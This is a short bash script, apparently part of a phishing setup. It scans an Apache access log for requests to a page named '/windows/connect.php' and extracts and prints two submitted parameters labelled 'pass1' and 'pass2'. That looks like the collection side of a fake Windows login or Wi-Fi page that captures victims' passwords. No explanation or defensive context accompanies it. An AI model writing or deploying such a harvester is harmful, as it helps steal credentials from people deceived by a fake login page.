



mon="$(sudo tail -1 /var/log/apache2/access.log)"

s="$(grep "GET /windows/connect.php?" /var/log/apache2/access.log | tail -1)"
f="$(echo $s | cut -d " " -f 7)"
	QUERY="$(echo $f | cut -d "?" -f2)"
	IFS="&"
	set -- $QUERY
	pass1="$(echo $1 | cut -d "=" -f2)"
	pass2="$(echo $2 | cut -d "=" -f2)"
	echo $pass1
	echo $pass2
tail -f /var/log/apache2/access.log

